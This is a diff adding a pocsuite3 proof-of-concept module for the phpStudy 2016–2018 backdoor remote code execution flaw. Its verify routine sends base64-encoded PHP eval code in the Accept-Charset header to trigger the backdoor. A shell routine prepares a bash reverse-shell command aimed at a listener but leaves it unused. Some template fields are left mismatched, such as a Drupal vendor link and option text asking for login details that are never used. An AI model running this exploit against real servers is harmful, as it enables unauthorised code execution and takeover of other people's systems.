@@ -1,0 +1,107 @@
+from collections import OrderedDict
+from pocsuite3.api import (
+    Output,
+    POCBase,
+    POC_CATEGORY,
+    register_poc,
+    requests,
+    VUL_TYPE,
+    get_listener_ip,
+    get_listener_port,
+)
+from pocsuite3.lib.core.interpreter_option import (
+    OptString,
+    OptDict,
+    OptIP,
+    OptPort,
+    OptBool,
+    OptInteger,
+    OptFloat,
+    OptItems,
+)
+from pocsuite3.modules.listener import REVERSE_PAYLOAD
+import base64
+
+
+class PhpstudyPoc(POCBase):
+    vulID = ""  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
+    version = "1"  # 默认为1
+    author = "callmeakun"  # PoC作者的大名
+    vulDate = "2025-02-28"  # 漏洞公开的时间,不知道就写今天
+    createDate = "2025-02-28"  # 编写 PoC 的日期
+    updateDate = "2025-02-28"  # PoC 更新的时间,默认和编写时间一样
+    references = ["https://www.freebuf.com/articles/web/215823.html"]  # 漏洞地址来源,0day不用写
+    name = "phpstudy_远程_RCE_后门-PoC"  # PoC 名称
+    appPowerLink = "https://www.drupal.org/"  # 漏洞厂商主页地址
+    appName = "phpstudy"  # 漏洞应用名称
+    appVersion = "phpStudy2016_phpStudy2018"  # 漏洞影响版本
+    vulType = "RCE"  # 漏洞类型,类型参考见 漏洞类型规范表
+    category = POC_CATEGORY.EXPLOITS.WEBAPP
+    samples = ['http://127.0.0.1/l.php']  # 测试样列,就是用 PoC 测试成功的网站
+    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
+    desc = """
+            phpStudy 2016 - 2018 部分php版本存在后⻔，攻击者可以利⽤该后⻔，实现远程代码
+            执⾏攻击。
+        """  # 漏洞简要描述
+    pocDesc = """
+            poc的用法描述
+        """  # POC用法描述
+
+    def _options(self):
+        opt = OrderedDict()  # value = self.get_option('key')
+        opt["string"] = OptString("phpinfo();", description="这个poc需要用户登录，请输入登录账号", require=True)
+        opt["integer"] = OptInteger(
+            "", description="这个poc需要用户密码，请输出用户密码", require=False
+        )
+        return opt
+
+    # 如果命令行不带参数，_verify就会默认执行
+    def _verify(self):
+        verify_cmd = "phpinfo()"
+        verify_code = f"eval({verify_cmd});"
+        verify_code_base64 = base64.b64encode(verify_code.encode()).decode()
+        verify_header = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
+        'Accept-Charset': f'{verify_code_base64}',
+        'Accept-Encoding': 'gzip,deflate'
+        }
+
+        # 验证代码
+        try:
+            responese = requests.get(url=self.url, headers=verify_header)
+        except:
+            pass
+        else:
+            if verify_cmd in responese.text:
+                result = {}
+                result['VerifyInfo'] = {}
+                result['VerifyInfo']['URL'] = self.url
+                result['VerifyInfo']['PAYLOAD'] = verify_code
+                return self.parse_output(result)
+
+    def _attack(self):
+        output = Output(self)
+        result = {}
+        # 攻击代码
+        pass
+
+    def _shell(self):
+        """
+        shell模式下，只能运行单个PoC脚本，控制台会进入shell交互模式执行命令及输出
+        """
+        cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())
+
+        # 攻击代码 execute cmd
+        pass
+
+
+def other_fuc():
+    pass
+
+
+def other_utils_func():
+    pass
+
+
+# 注册 DemoPOC 类
+register_poc(PhpstudyPoc)
